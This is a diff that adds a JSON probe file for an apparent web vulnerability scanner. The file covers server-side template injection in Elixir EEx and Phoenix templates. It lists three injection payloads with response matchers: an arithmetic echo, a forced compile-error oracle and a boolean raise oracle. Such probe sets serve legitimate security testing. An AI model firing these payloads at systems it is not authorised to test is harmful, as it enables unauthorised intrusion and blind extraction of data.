@@ -1,0 +1,58 @@
+{
+  "category": "ssti_elixir",
+  "description": "Server-side template injection in Elixir template engines (EEx, Phoenix HEEx). New parent (2026-07): no existing SSTI parent covers Elixir. Error-oracle extraction per PortSwigger Top-10-2025 #1 (Successful Errors). Use against Phoenix apps rendering user input through EEx.",
+  "contexts": {
+    "eex_arithmetic": {
+      "description": "EEx evaluates <%= %> expressions server-side. Arithmetic marker 1337=1336+1 confirms evaluation.",
+      "tech_match": ["Elixir", "Phoenix", "EEx", "HEEx"],
+      "param_match": ["template", "name", "message", "q", "comment"],
+      "probes": [
+        {
+          "payload": "<%= 1336+1 %>",
+          "description": "EEx arithmetic echo — 1337 in the response proves SSTI.",
+          "matchers": [
+            {"type": "word", "words": ["1337"], "condition": "and", "weight": 80}
+          ],
+          "severity": "critical",
+          "confidence_boost": 80,
+          "variables": {}
+        }
+      ]
+    },
+    "error_based_blind": {
+      "description": "Force an EEx/Phoenix compile or runtime error whose message echoes evaluated output; blind extraction where no reflection exists.",
+      "tech_match": ["Elixir", "Phoenix", "EEx"],
+      "param_match": ["template", "name", "q"],
+      "probes": [
+        {
+          "payload": "<%= 1336+1 %><%= undefined_zz.err %>",
+          "description": "Error after evaluation; 1337 echoed in the CompileError/ArgumentError body.",
+          "matchers": [
+            {"type": "regex", "pattern": "1337", "weight": 60},
+            {"type": "word", "words": ["CompileError", "ArgumentError", "protocol Enumerable", "(elixir)", "(eex)"], "condition": "or", "weight": 40}
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "boolean_error_blind": {
+      "description": "Boolean-error oracle for Elixir: raise iff an evaluated condition holds.",
+      "tech_match": ["Elixir", "Phoenix", "EEx"],
+      "param_match": ["template", "name"],
+      "probes": [
+        {
+          "payload": "<%= if 7*7==49, do: raise(\"ZZ\"), else: 1 %>",
+          "description": "Differential error vs benign baseline.",
+          "matchers": [
+            {"type": "word", "words": ["RuntimeError", "ZZ", "Error"], "condition": "or", "weight": 50}
+          ],
+          "severity": "medium",
+          "confidence_boost": 40,
+          "variables": {}
+        }
+      ]
+    }
+  }
+}
